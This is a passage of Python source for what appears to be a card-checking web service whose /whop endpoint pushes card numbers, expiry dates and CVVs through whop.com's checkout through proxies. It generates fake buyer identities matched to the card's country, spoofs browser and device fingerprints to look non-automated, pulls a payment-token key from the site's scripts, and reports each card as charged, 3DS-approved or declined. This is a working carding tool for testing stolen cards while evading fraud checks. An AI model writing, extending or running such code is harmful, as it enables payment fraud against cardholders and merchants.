    "NG": ["Allen Avenue","Awolowo Road","Bola Tinubu","Adesola Street","Opebi Road"],
    "BR": ["Rua das Flores","Avenida Paulista","Rua XV de Novembro","Rua Ipê","Avenida Brasil"],
    "MX": ["Calle Juarez","Avenida Reforma","Calle Hidalgo","Avenida Insurgentes","Calle Morelos"],
    "CA": ["Yonge Street","Rue Sainte-Catherine","Robson Street","Whyte Avenue","Portage Avenue"],
    "AU": ["George Street","Collins Street","Elizabeth Street","Queen Street","Pitt Street"],
    "VN": ["Le Loi","Nguyen Hue","Le Thanh Ton","Dong Khoi","Hai Ba Trung"],
    "DE": ["Hauptstrasse","Bahnhofstrasse","Schulstrasse","Lindenallee","Marktplatz"],
    "FR": ["Rue de la Paix","Boulevard Saint-Michel","Rue Victor Hugo","Avenue de la Republique"],
    "ZA": ["Long Street","Voortrekker Road","Main Road","Loop Street","Jan Smuts Avenue"],
    "TR": ["Ataturk Bulvari","Istiklal Caddesi","Cumhuriyet Caddesi","Bagdat Caddesi"],
    "AE": ["Sheikh Zayed Road","Al Wasl Road","Jumeirah Beach Road","Al Maktoum Road"],
    "EG": ["Tahrir Street","Ramses Street","Corniche El Nil","Mostafa El Nahas Street"],
    "KE": ["Moi Avenue","Kenyatta Avenue","Ngong Road","Limuru Road","Waiyaki Way"],
    "BD": ["Road 11","Gulshan Avenue","Dhanmondi Road","Farmgate"],
}
_DEFAULT_STREETS = _STREETS_BY_CU["US"]


_STATE_CITY = {
    "CA":"Los Angeles","TX":"Houston","FL":"Miami","NY":"New York","WA":"Seattle",
    "CO":"Denver","MI":"Detroit","GA":"Atlanta","AZ":"Phoenix","OH":"Cleveland",
    "IL":"Chicago","PA":"Philadelphia","NC":"Charlotte","VA":"Richmond","MA":"Boston",
    "NJ":"Newark","MD":"Baltimore","MO":"St. Louis","OR":"Portland",
}


def whop_profile(country=""):
    """Build a coherent identity for the card's issuing country.

    country: ISO-2 from the BIN lookup. Falls back to the US only when the BIN
    is unknown, so an unmapped card still produces a valid (if generic) address.
    """
    cu = (country or "").upper()[:2]
    p = dict(_CU.get(cu) or _CU[_DEFAULT_CU])
    p["country"] = cu if cu in _CU else _DEFAULT_CU
    p["sec_ch"] = p["sec"]
    p["platform"] = p.get("plat", "Win32")
    mac = p["platform"] == "MacIntel"
    p["ua"] = _WHOP_UA_MAC if mac else _WHOP_UA_WIN
    # WebGL must agree with the platform: a Mac reporting an NVIDIA D3D11
    # renderer (or vice versa) is an immediate contradiction.
    p["vendor"], p["renderer"] = ("Apple Inc.", "Apple M1") if mac else random.choice([
        ("Google Inc. (NVIDIA)", "ANGLE (NVIDIA, NVIDIA GeForce RTX 4060 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("Google Inc. (NVIDIA)", "ANGLE (NVIDIA, NVIDIA GeForce GTX 1660 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("Intel Inc.", "ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("Google Inc. (AMD)", "ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
    ])

    cities = p["cities"]
    city, region, postcode = random.choice(cities)
    streets = _STREETS_BY_CU.get(p["country"], _DEFAULT_STREETS)
    first = random.choice(p["nm"])
    last = random.choice(p["sn"])
    style = random.random()
    if style < 0.5:
        name = f"{first} {last}"
    elif style < 0.8:
        name = f"{first} {last[0]}."
    else:
        name = f"{first} {last[0]}. {last}"

    # Email local part must be a single valid atom: no spaces (e.g. "Al Farsi").
    def _atom(txt):
        return "".join(ch for ch in txt.lower() if ch.isalnum())

    handle = f"{_atom(first)}.{_atom(last)}{random.randint(1, 9999)}"
    email = f"{handle}@{random.choice(p['dom'])}"

    sw, sh = random.choice([(1920, 1080), (1536, 864), (1440, 900), (1366, 768), (2560, 1440)])
    p.update(
        country_name=city, city=city, region=region, zip=postcode,
        line1=f"{random.randint(1, 240)} {random.choice(streets)}",
        name=name, email=email,
        accept=p["acc"], tzoff=p["off"],
        screen_w=sw, screen_h=sh, hw=random.choice([4, 8, 12, 16]),
        mem=random.choice([8, 16, 32]), dpr=random.choice(p["dpr"]),
        inner_w=int(sw * 0.6) + random.randint(-50, 50),
        inner_h=int(sh * 0.8) - 40 + random.randint(-30, 30),
    )
    return p


def whop_trace():
    return str(uuid.uuid4()).replace("-", "")


def whop_span():
    return str(uuid.uuid4())[:16]


def whop_baggage(trace_id, release):
    sr = f"{random.random():.16f}"[:17]
    return (f"sentry-environment=production,sentry-release={release},"
            f"sentry-public_key=c6989961c9181cc2db941b290d874f29,"
            f"sentry-trace_id={trace_id},sentry-org_id=1320754,"
            f"sentry-sampled=false,sentry-sample_rand={sr},sentry-sample_rate=1")


def whop_extract(html):
    """Pull plan/account/release out of the landing page."""
    plan = account = release = None
    m = re.search(r'plan_[a-zA-Z0-9]+', html)
    if m:
        plan = m.group(0)
    m = re.search(r'biz_[a-zA-Z0-9]+', html)
    if m:
        account = m.group(0)
    m = re.search(r'[a-f0-9]{40}', html)
    if m:
        release = m.group(0)
    return plan, account, (release or "unknown")


def whop_msg(resp):
    """Human-readable reason out of a whop error payload."""
    if not isinstance(resp, dict):
        return ""
    for key in ("last_confirmation_error", "last_confirm_error"):
        e = resp.get(key)
        if isinstance(e, dict):
            parts = [str(e.get("code") or ""), str(e.get("decline_code") or ""),
                     str(e.get("message") or "").strip()]
            parts = [p for p in parts if p]
            if parts:
                return " · ".join(parts)
    pay = resp.get("payment")
    if isinstance(pay, dict):
        for key in ("last_payment_error", "error"):
            e = pay.get(key)
            if isinstance(e, dict) and (e.get("message") or e.get("code")):
                return " · ".join(str(x) for x in
                                  (e.get("code"), e.get("message")) if x)
        for key in ("failure_code", "failure_reason", "decline_code"):
            if pay.get(key):
                return f"Declined: {pay[key]}"
        st = str(pay.get("status", "")).lower()
        if st in ("failed", "declined", "canceled"):
            return pay.get("message") or st
    if resp.get("decline_code"):
        return f"Declined: {resp['decline_code']}"
    st = str(resp.get("status", "")).lower()
    if st in ("failed", "declined", "canceled"):
        return resp.get("message") or st
    return ""


def _short_resp(msg, limit=48):
    """Raw gateway reason kept short: first code token, not collapsed.

    whop_msg joins the reason chunks with ' · ' (code first); we keep the first
    chunk so the user sees the actual reason ('payment_failed', ...) instead of
    a generic phrase, truncated to a short line.
    """
    raw = str(msg or "").strip()
    if not raw:
        return "Card declined"
    raw = re.sub(r"\s+", " ", raw.split(" · ", 1)[0].strip())
    if len(raw) > limit:
        cut = raw[:limit].rsplit(" ", 1)[0]
        if cut:
            return cut + "…"
        return raw[:limit] + "…"
    return raw


def whop_run(url, cc, proxy, country="", deadline_s=90.0):
    """Run one card through whop. Returns a result dict."""
    end = time.monotonic() + deadline_s
    num, month, year, cvv = cc
    card = f"{num}|{month}|{year}|{cvv}"
    proxies = {"http": proxy, "https": proxy}
    fp = whop_profile(country)
    mac = fp.get("platform") == "MacIntel"
    imp = random.choice(_WHOP_CHROME)
    ver = int("".join(ch for ch in imp if ch.isdigit()))
    ua = _whop_ua(ver, mac)
    sch = f'"Not_A Brand";v="24", "Chromium";v="{ver}", "Google Chrome";v="{ver}"'
    s = curl_requests.Session(impersonate=imp)
    t0 = time.time()

    def out(status, message, amount=0.0, currency=""):
        try:
            amount = float(amount)
        except (TypeError, ValueError):
            amount = 0.0
        return {"Cc": card, "Status": status, "Response": message,
                "Amount": amount, "Currency": currency, "Gateway": "Whop",
                "Seconds": round(time.time() - t0, 2)}

    def hdrs(trace=None, is_doc=False, extra=None):
        h = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
                      if is_doc else "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": fp["accept"],
            "api-version-date": WHOP_API_VER,
            "origin": "https://whop.com",
            "referer": url,
            "sec-ch-ua": sch,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": fp["sec_ch"],
            "sec-fetch-dest": "document" if is_doc else "empty",
            "sec-fetch-mode": "navigate" if is_doc else "cors",
            "sec-fetch-site": "same-origin",
            "sec-gpc": "1",
            "priority": "u=0, i" if is_doc else "u=1, i",
            "user-agent": ua,
            "whop-private-schema": "true",
            "x-fern-language": "JavaScript",
            "x-fern-runtime": "browser",
            "x-fern-runtime-version": ua,
        }
        if trace:
            h["sentry-trace"] = f"{trace}-{whop_span()}-1"
            h["baggage"] = whop_baggage(trace, "release")
        if extra:
            h.update(extra)
        return h

    def need(step):
        if time.monotonic() > end:
            raise RuntimeError(f"deadline reached at {step}")

    # ── 1. landing ───────────────────────────────────────────────────────────
    wuid, ajs, anon, ssk = (f"wuid_{uuid.uuid4().hex[:16]}", str(uuid.uuid4()),
                            str(uuid.uuid4()), str(uuid.uuid4()))
    for k, v in (("_wuid", wuid), ("_wuid_link", wuid), ("ajs_anonymous_id", ajs),
                 ("whop_anonymous_id", anon), ("whop-core.ssk", ssk), ("_whop_ssk", ssk)):
        s.cookies.set(k, v, domain="whop.com")
    r = s.get(url, headers=hdrs(is_doc=True), proxies=proxies, verify=False, timeout=WHOP_TIMEOUT)
    if r.status_code >= 400:
        return out("error", f"Landing failed (http {r.status_code})")
    need("landing")
    plan, account, release = whop_extract(r.text)
    if not plan or not account:
        return out("error", "Missing plan/account ID")

    cookies = "; ".join([f"_wuid={wuid}", f"ajs_anonymous_id={ajs}",
                         f"whop_anonymous_id={anon}", f"whop-core.ssk={ssk}", f"_whop_ssk={ssk}"])
    affiliate = parse_qs(urlparse(url).query).get("a", [""])[0]

    # Affiliate cookies on the landing request, like a real visit.
    slug_guess = urlparse(url).path.strip("/").split("/")[-1]
    if affiliate:
        s.cookies.set("__Host-affiliate_code", affiliate, domain="whop.com")
        if slug_guess:
            s.cookies.set(f"__Host-whop-core.affiliate-{slug_guess}", affiliate, domain="whop.com")
            s.cookies.set(f"whop-core.affiliate-{slug_guess}", affiliate, domain="whop.com")

    product_id = None
    m = re.search(r'prod_[a-zA-Z0-9]+', r.text)
    if m:
        product_id = m.group(0)

    # ── affiliate resolve-tracking ──────────────────────────────────────────
    tracking_link_id = None
    if affiliate and product_id:
        t = whop_trace()
        try:
            rr = s.post("https://whop.com/api/affiliate/resolve-tracking/",
                        json={"companyId": account, "accessPassId": product_id},
                        headers=hdrs(t, extra={"content-type": "application/json",
                                               "x-ssk": ssk}),
                        proxies=proxies, verify=False, timeout=WHOP_TIMEOUT)
            if rr.status_code == 200:
                d = rr.json() or {}
                tracking_link_id = (d.get("tracking_link_id") or d.get("id")
                                   or d.get("trackingLinkId"))
                if tracking_link_id:
                    s.cookies.set(f"__Host-whop-core.tracking-link-{account}",
                                  tracking_link_id, domain="whop.com")
                    s.cookies.set(f"whop-core.tracking-link-{account}",
                                  tracking_link_id, domain="whop.com")
        except Exception as e:
            log.info("whop resolve-tracking failed: %s", e)

    # ── tracking pixels ─────────────────────────────────────────────────────
    try:
        s.get(f"https://whop.com/api/v1/accounts/{account}/tracking_pixels",
              headers=hdrs(whop_trace(), extra={"accept": "application/json",
                                               "x-ssk": ssk}),
              proxies=proxies, verify=False, timeout=min(WHOP_TIMEOUT, 15))
    except Exception as e:
        log.info("whop tracking_pixels failed: %s", e)

    # ── BasisTheory key from the deployed env bundle ────────────────────────
    bt_key = BT_API_KEY
    m = re.search(r'href="(/_web/assets/[^/]+/env-[a-zA-Z0-9_-]+\.js)"', r.text)
    if m:
        try:
            re_env = s.get("https://whop.com" + m.group(1),
                           headers=hdrs(is_doc=True),
                           proxies=proxies, verify=False, timeout=WHOP_TIMEOUT)
            mk = re.search(r'VITE_PAYOUTS_BASIS_THEORY_API_KEY:\s*[`\'"]([^`\'"]+)[`\'"]',
                           re_env.text)
            if mk:
                bt_key = mk.group(1)
        except Exception as e:
            log.info("whop env.js fetch failed: %s", e)
    if not bt_key:
        m2 = re.search(r'key_prod_us_pub_[a-zA-Z0-9]+', r.text)
        if m2:
            bt_key = m2.group(0)

    # ── 2. checkout session ──────────────────────────────────────────────────
    need("checkout_session")
    body = {"items": [{"plan": plan, "quantity": 1}], "tracking_link_ids_by_account": {}}
    if affiliate:
        body["affiliate_code"] = affiliate
        body["attribution"] = {"source": "product_page_direct"}
    if tracking_link_id and account:
        body["tracking_link_ids_by_account"] = {account: tracking_link_id}
    t = whop_trace()
    r = s.post("https://whop.com/api/v1/checkout_sessions", json=body,
               headers=hdrs(t, extra={"content-type": "application/json",
                                      "authorization": "Bearer public",
                                      "x-ssk": ssk, "cookie": cookies}),
               proxies=proxies, verify=False, timeout=WHOP_TIMEOUT)
    try:
        d2 = r.json()
    except Exception:
        d2 = {}
    chs_id = d2.get("id") or ""
    client_secret = d2.get("client_secret") or ""
    if not chs_id or not client_secret:
        reason = whop_msg(d2) or f"http {r.status_code}: {r.text[:120]}"
        return out("error", f"No checkout session: {reason}")
    seller = d2.get("seller") or {}
    if isinstance(seller, dict) and seller.get("id"):
        account = seller["id"]
    quote = d2.get("quote") or {}
    amount = quote.get("base_amount") or quote.get("total_amount") or 0.0
    currency = (quote.get("base_currency") or "USD").upper()
    # ── calculate_breakdown (authoritative amount) ──────────────────────────
    try:
        rb = s.post(f"https://whop.com/api/v1/checkout_sessions/{chs_id}/calculate_breakdown",
                    json={"client_secret": client_secret, "supports_buyer_fee": True},
                    headers=hdrs(whop_trace(), extra={"content-type": "application/json",
                                                       "x-ssk": ssk, "cookie": cookies}),
                    proxies=proxies, verify=False, timeout=WHOP_TIMEOUT)
        d3 = rb.json() or {}
        tot = d3.get("total") or {}
        if tot.get("amount"):
            amount = tot["amount"]
            currency = (tot.get("currency") or currency).upper()
    except Exception as e:
        log.info("whop calculate_breakdown failed: %s", e)

    # ── conversions (identify) ──────────────────────────────────────────────
    try:
        s.post("https://t.whop.tw/conversions",
               json={"event_name": "identify", "company_id": account,
                     "event_time": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                     "url": url,
                     "user": {"anonymous_id": wuid, "linked_anonymous_id": ajs},
                     "context": {"user_agent": ua,
                                 "screen_resolution": f"{fp['screen_w']}x{fp['screen_h']}",
                                 "language": fp["lang"], "timezone": fp["tz"],
                                 "fingerprint": uuid.uuid4().hex[:32],
                                 "fingerprint_confidence": round(random.uniform(0.3, 0.6), 2)},
                     "referrer_url": url, "source": "link"},
               headers={"accept": "*/*", "content-type": "application/json",
                        "origin": "https://whop.com", "referer": "https://whop.com/",
                        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site", "user-agent": ua},
               proxies=proxies, verify=False, timeout=min(WHOP_TIMEOUT, 15))
    except Exception as e:
        log.info("whop conversions failed: %s", e)

    need("card_session")

    # ── 3. BasisTheory session ───────────────────────────────────────────────
    device = {
        "uaBrands": [{"brand": "Not_A Brand", "version": "8"},
                     {"brand": "Chromium", "version": "120"},
                     {"brand": "Google Chrome", "version": "120"}],
        "uaMobile": False, "uaPlatform": fp["os"], "languages": [fp["lang"], "en"],
        "timeZone": fp["tz"], "cookiesEnabled": True, "localStorageEnabled": True,
        "sessionStorageEnabled": True, "platform": fp["platform"],
        "hardwareConcurrency": fp["hw"], "deviceMemoryGb": fp["mem"],
        "screenWidth": fp["screen_w"], "screenHeight": fp["screen_h"],
        "innerWidth": fp["inner_w"], "innerHeight": fp["inner_h"],
        "devicePixelRatio": fp["dpr"], "maxTouchPoints": 0,
        "plugins": ["PDF Viewer", "Chrome PDF Viewer", "Chromium PDF Viewer",
                    "Microsoft Edge PDF Viewer", "WebKit built-in PDF"],
        "webdriver": False, "suspectedHeadless": False,
        "webglVendor": fp["vendor"], "webglRenderer": fp["renderer"],
    }
    dev_b64 = base64.b64encode(json.dumps(device).encode()).decode()
    bt_h = {"accept": "*/*", "accept-encoding": "gzip, deflate, br",
            "accept-language": fp["accept"], "bt-api-key": bt_key,
            "bt-device-info": dev_b64, "content-type": "application/json",
            "origin": "https://js.basistheory.com",
            "referer": "https://js.basistheory.com/web-elements/2.12.2/hosted-elements/data-element.html",
            "sec-ch-ua": sch, "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": fp["sec_ch"],
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin", "user-agent": ua}

    bt_wait()
    r = s.post("https://js.basistheory.com/api/sessions", json={"deviceInfo": device},
               headers=bt_h, proxies=proxies, verify=False, timeout=WHOP_TIMEOUT)
    if r.status_code == 429:
        bt_penalise()
        return out("error", "BT rate limited (public key 100req/60s)")
    try:
        dbt = r.json()
    except Exception:
        dbt = {}
    nonce = dbt.get("nonce") or ""
    conkey = dbt.get("session_key") or ""      # used by the PATCH requests below
    if not nonce:
        return out("error", f"No BT nonce (http {r.status_code})")
    need("card_session_auth")

    # ── 4. authorise the card session (its container is NOT used) ────────────
    t = whop_trace()
    r = s.post("https://whop.com/api/v1/payment_method_types/card/session",
               json={"account_id": account, "nonce": nonce},
               headers=hdrs(t, extra={"content-type": "application/json",
                                      "x-ssk": ssk, "cookie": cookies}),
               proxies=proxies, verify=False, timeout=WHOP_TIMEOUT)
    if r.status_code >= 400:
        return out("error", f"Card session rejected (http {r.status_code}): {r.text[:100]}")

    # Container comes from the card/session response (as in the reference
    # script); the sha256(nonce) form is only a fallback when it is absent.
    try:
        d5 = r.json()
    except Exception:
        d5 = {}
    sc = ((d5.get("session") or {}).get("container") or "")
    if sc:
        container = sc if sc.startswith("/") else "/" + sc
        if not container.endswith("/"):
            container += "/"
    else:
        container = "/card-assembly/" + hashlib.sha256(nonce.encode()).hexdigest() + "/"
    need("token")

    # ── 5. BasisTheory token with the whole card in one call ─────────────────
    try:
        mm, yy = int(month), int(year)
    except ValueError:
        return out("error", "Invalid card month/year")
    if yy < 100:
        yy += 2000
    exp = (time.strftime("%Y-%m-%dT%H:%M:%S.000Z",
                         time.gmtime(time.time() + 3600)))
    bt_wait()
    r = s.post("https://js.basistheory.com/api/tokens",
               json={"type": "card", "containers": [container], "expires_at": exp,
                     "data": {"number": num, "expiration_month": mm,
                              "expiration_year": yy, "cvc": cvv}},
               headers=bt_h, proxies=proxies, verify=False, timeout=WHOP_TIMEOUT)
    if r.status_code == 429:
        bt_penalise()
        return out("error", "BT rate limited (public key 100req/60s)")
    try:
        dt = r.json()
    except Exception:
        dt = {}
    card_token = dt.get("id") or ""
    if not card_token:
        return out("error", f"No card token (http {r.status_code}): {r.text[:100]}")
    if "expiration_month" not in (dt.get("data") or {}):
        return out("error", "Card expiry not stored by token API")

    # ── 5b. PATCH expiry, then CVC (kept verbatim from the reference script) ──
    # The token above is already created with the complete card, so these are
    # redundant; they are still issued to stay faithful to the real client
    # sequence. Note: this endpoint answers 401 for the session key, so the
    # result is logged rather than treated as fatal.
    patch_h = {**bt_h,
               "bt-api-key": conkey,
               "bt-device-info": dev_b64,
               "content-type": "application/merge-patch+json",
               "referer": "https://js.basistheory.com/web-elements/2.12.2/"
                          "hosted-elements/card-expiration-date-element.html?element_id=0da4cabc"}
    try:
        bt_wait()
        pr = s.patch(f"https://js.basistheory.com/api/tokens/{card_token}",
                     json={"data": {"expiration_month": mm, "expiration_year": yy}},
                     headers=patch_h, proxies=proxies, verify=False, timeout=WHOP_TIMEOUT)
        if pr.status_code == 429:
            bt_penalise()
        log.info("whop PATCH expiry -> %s", pr.status_code)
    except Exception as e:
        log.info("whop PATCH expiry failed: %s", e)

    patch_h["referer"] = ("https://js.basistheory.com/web-elements/2.12.2/hosted-elements/"
                          "card-verification-code-element.html?element_id=f4fa4112")
    try:
        bt_wait()
        pr = s.patch(f"https://js.basistheory.com/api/tokens/{card_token}",
                     json={"data": {"cvc": cvv}},
                     headers=patch_h, proxies=proxies, verify=False, timeout=WHOP_TIMEOUT)
        if pr.status_code == 429:
            bt_penalise()
        log.info("whop PATCH cvc -> %s", pr.status_code)
    except Exception as e:
        log.info("whop PATCH cvc failed: %s", e)

    need("confirmation_token")

    # ── 6. confirmation token ────────────────────────────────────────────────
    t = whop_trace()
    ct_body = {
        "account_id": account,
        "payment_method": {"type": "card", "category": "card",
                           "card": {"token": card_token}},
        "setup_future_usage": "off_session",
        "billing_details": {
            "email": fp["email"], "name": fp["name"],
            "address": {"country": fp["country"], "line1": fp["line1"],
                        "city": fp["city"], "state": fp["region"],
                        "postal_code": fp["zip"]},
        },
        "return_url": f"{url}?session={chs_id}",
        "browser_info": {
            "platform": fp["platform"], "color_depth": 24,
            "screen_height": fp["screen_h"], "screen_width": fp["screen_w"],
            "javascript_enabled": True, "language": fp["lang"],
            "java_enabled": False, "browser_time_difference": fp["tzoff"],
        },
    }
    r = s.post("https://whop.com/api/v1/confirmation_tokens", json=ct_body,
               headers=hdrs(t, extra={"content-type": "application/json",
                                      "authorization": "Bearer public",
                                      "x-ssk": ssk, "cookie": cookies,
                                      "referer": f"{url}?session={chs_id}"}),
               proxies=proxies, verify=False, timeout=WHOP_TIMEOUT)
    try:
        dct = r.json()
    except Exception:
        dct = {}
    ctok = dct.get("id") or ""
    if not ctok:
        return out("error", f"No confirmation token (http {r.status_code}): {r.text[:120]}")

    # ── 7. confirm ───────────────────────────────────────────────────────────
    need("confirm")
    t = whop_trace()
    r = s.post(f"https://whop.com/api/v1/checkout_sessions/{chs_id}/confirm",
               json={"client_secret": client_secret, "confirmation_token": ctok,
                     "attestations": {"tos_accepted": True}},
               headers=hdrs(t, extra={"content-type": "application/json",
                                      "x-ssk": ssk, "cookie": cookies,
                                      "referer": f"{url}?session={chs_id}"}),
               proxies=proxies, verify=False, timeout=WHOP_TIMEOUT)
    try:
        conf = r.json()
    except Exception:
        conf = {}

    # ── 8. poll ──────────────────────────────────────────────────────────────
    for _ in range(12):
        pay = conf.get("payment") or {}
        na = conf.get("next_action") or {}
        na_type = na.get("type", "")
        # Success / 3DS are decided BEFORE any error string: whop keeps
        # last_confirmation_error between attempts, so checking errors first
        # would report a decline for a payment that actually went through.
        if pay.get("status") == "succeeded":
            return out("charged", "Purchase Successful", amount, currency)
        if na_type in ("use_stripe_sdk", "redirect_to_url", "3ds"):
            return out("approved", "3DS_REQUIRED", amount, currency)
        msg = whop_msg(conf)
        if msg:
            return out("declined", _short_resp(msg), amount, currency)
        if str(conf.get("status", "")).lower() in ("failed", "expired"):
            return out("declined", _short_resp(conf.get("status")), amount, currency)
        if na_type == "wait_for_payment":
            secs = na.get("poll_after_seconds", 3)
            try:
                secs = max(1, min(10, int(secs)))
            except Exception:
                secs = 3
            time.sleep(secs)
            need("poll")
            t = whop_trace()
            try:
                r = s.get(f"https://whop.com/api/v1/checkout_sessions/{chs_id}",
                          params={"client_secret": client_secret},
                          headers=hdrs(t, extra={"x-ssk": ssk, "cookie": cookies}),
                          proxies=proxies, verify=False, timeout=WHOP_TIMEOUT)
                conf = r.json()
            except Exception:
                break
            continue
        break

    return out("error", "Payment result unavailable")


@app.route("/whop")
def handle_whop():
    cc_raw = request.args.get("cc", "").strip()
    url = request.args.get("url", "").strip()

    resp = {"Cc": cc_raw, "Status": "error", "Response": "ERROR",
            "Amount": 0.0, "Currency": "", "Gateway": "Whop"}
    if not cc_raw or not url:
        resp["Response"] = "cc and url are required"
        return jsonify(resp), 400

    parts = cc_raw.split("|")
    if len(parts) != 4:
        resp["Response"] = "invalid card format"
        return jsonify(resp), 400
    if not luhn_valid(parts[0]):
        resp["Status"] = "luhn_fail"
        resp["Response"] = "Luhn check failed"
        return jsonify(resp)

    # Concurrency gate, same shape as /shopii.
    if not _checkout_sem.acquire(timeout=60):
        resp["Response"] = "SERVER_BUSY"
        return jsonify(resp), 503
    try:
        country = request.args.get("country", "").strip()
        proxy_url = whop_pick_proxy(country)    # never fall back to direct
        _set_deadline(WHOP_TIMEOUT * 3)
        resp = whop_run(url, parts, proxy_url, country)
    except Exception as e:
        log.warning("whop run failed: %s", e)
        resp = {"Cc": cc_raw, "Status": "error", "Response": f"ERROR: {e}",
                "Amount": 0.0, "Currency": "", "Gateway": "Whop"}
    finally:
        _checkout_sem.release()
    return jsonify(resp)


# ══════════════════════════════ ENTRY POINT ══════════════════════════════════

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8003))
    log.info("Shopify Checker API listening on :%d (waitress, %d threads, %d channels)",
             port, HUENCY_THREADS, HUENCY_CHANNELS)
    log.info("Endpoint: http://localhost:%d/shopii?cc=NUM|MM|YYYY|CVV&site=URL&proxy=ip:port", port)
    log.info("Health:   http://localhost:%d/health", port)
    serve(app, host="0.0.0.0", port=port,
          threads=HUENCY_THREADS,
          connection_limit=HUENCY_CHANNELS,
          channel_timeout=30,
          channel_request_lookahead=0)
